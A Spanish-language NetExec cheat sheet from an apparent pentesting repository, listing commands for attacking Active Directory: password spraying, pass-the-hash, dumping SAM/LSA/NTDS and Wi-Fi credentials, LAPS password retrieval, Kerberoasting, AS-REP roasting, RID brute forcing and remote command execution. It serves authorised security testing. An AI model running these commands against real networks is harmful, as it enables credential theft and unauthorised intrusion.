# NetExec Cheat Sheet

#### Listar equipos dentro de la red de un AD
```
netexec smb 192.168.1.0/24
```

#### SMB con credenciales a dominio WORKGROUP
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -d WORKGROUP
```

#### SMB con credenciales y especificando a un puerto
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --port <PORT>
```

#### Password Spraying
```
netexec smb 192.168.1.0/24 -u '<USERNAME>' -p listpassword.txt | grep +
```

#### Spraying Attack con usuario y contraseña
```
netexec smb <IP-ADDRESS> -u users.txt -p passwd.txt
```

#### Spraying Attack usando HashNTLM
```
netexec smb <IP-ADDRESS> -u users.txt -H '<HASH-NTLM>'
```

#### Conocer en que equipos se puede autenticar especificando un usuario y password
```
netexec smb 192.168.1.0/24 -u '<USERNAME>' -p '<PASSWORD>'
```

#### Spraying Attack con usuario y contraseña lineal
```
netexec smb <IP-ADDRESS> -u users.txt -p passwd.txt --no-bruteforce --continue-on-success
```

#### Enumeración de directorios compartidos SMB con NULL session
```
netexec smb <IP-ADDRESS> -u '' -p ''
netexec smb <IP-ADDRESS> -u 'a' -p ''
```

#### Enumeración de directorios compartidos SMB con NULL session
```
netexec smb <IP-ADDRESS> -u 'null' -p '' --shares
```

#### Enumeración de directorios compartidos SMB y mostrar datos y archivos en un archivo JSON que guarda sobre los archivos compartidos con acceso de lectura
```
netexec smb <IP-ADDRESS> -u 'null' -p '' -M spider_plus
```

#### Descargar un archivo de un directorio compartido
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --share <DIRECTORY-NAME> --get-file <FILE-NAME> <OUTPUT-NAME>
```

#### Descargar todos los archivos que contenga el servidor
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
```

#### Enviar un archivo de un directorio compartido
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE-NAME> \\Windows\\Temp\\<OUTPUT-NAME>
```

#### Mostrar la cuota de creación de cuentas de equipo en Active Directory, lo que puede ser útil para identificar posibles oportunidades de crear equipos fraudulentos o eludir políticas de grupo.
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M maq
```

#### Mostrar el Identificador de seguridad (SID) del dominio
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --get-sid
```

#### Enumeración de los usuarios del Directorio Activo
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --users
```

#### Enumeración de los usuarios activos (no muestra los deshabilitados) del Directorio Activo
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --active-users
```

#### Enumeración de las cuentas con privilegios elevados, como los administradores de dominio, comprobando el atributo AdminCount
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --admin-count
```

#### Enumeración de los grupos del Directorio Activo
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --groups
```

#### Enumerar los grupos a los que pertenece un usuario específico
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M groupmembership -o USER="<USER>"
```

#### Enumerar los usuarios a los que pertenece un grupo en específico
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M group-mem -o GROUP="<GROUP-NAME>"
```

#### Enumeración de los usarios logueados actualmente
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
```

#### Enumeración de los grupos locales
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --local-group
```

#### PassTheHash
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -H '<HASH>' --local-auth
```

#### Dumping Hashes SAM
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --sam
```

#### Dumping Hashes LSA
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --lsa
```

#### Dumping Hashes NTDS
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --ntds
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --ntds vss
```

#### Obtener la politica de contraseñas del AD
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
```

#### Obtener la politica de contraseñas del AD
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M pso
```

#### Dumping WIFI Password
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M wireless
```

#### Ver información sobre la red y subredes del equipo
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-network
```

#### Obtener las descripciones de los usuarios de LDAP
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M user-desc
```

#### Obtener las descripciones más detalladas de los usuarios de LDAP
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
```

#### Obtener la contraseña de algun usuario
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-userPassword
```

#### Obtener la contraseña de algun usuario en los sistemas basados en Unix
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-unixUserPassword
```

#### Enumeración de usuario (Fuerza Bruta) por RID (RID Cycling Attack)
```
netexec smb <IP-ADDRESS> -u 'guest' -p '' --rid-brute
```

#### Recupera la contraseña LAPS de las cuentas de administrador local
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M laps
```

#### Lectura DACL (Discretionary Access Control List) se utiliza para ver las listas de control de acceso de objetos específicos de AD, lo que puede ayudar a identificar accesos excesivamente permisivos o configuraciones erróneas
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --kdcHost <DOMAIN> -M daclread -o TARGET=Administrator ACTION=read
```

#### Ataque de Kerberoasting
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting <OUTPUT-FILE>
```

#### Ataque de Asreproast
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --asreproast <OUTPUT-FILE>
```

#### Recopilar datos para su uso en BloodHound
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --collection All --dns-server <IP-ADDRESS>
```

#### Ejecutar comando Whoami
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
```

#### Ejecutar comando Powershell
```
netexec winrm <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -C '<COMMAND>'
```

#### Enumerar las relaciones de confianza entre diferentes dominios, lo que puede ser útil para el movimiento lateral y para atacar dominios interconectados
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
```

#### identificar las cuentas de ordenador precreadas que podrían utilizarse para eludir los controles de seguridad o crear máquinas fraudulentas en la red
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k
```

#### Comprobar si hay configuraciones erróneas o explotables en ADCS
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
```

#### Elevar Privilegios cuando el usuario pertenece al grupo "Backup Operators"
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)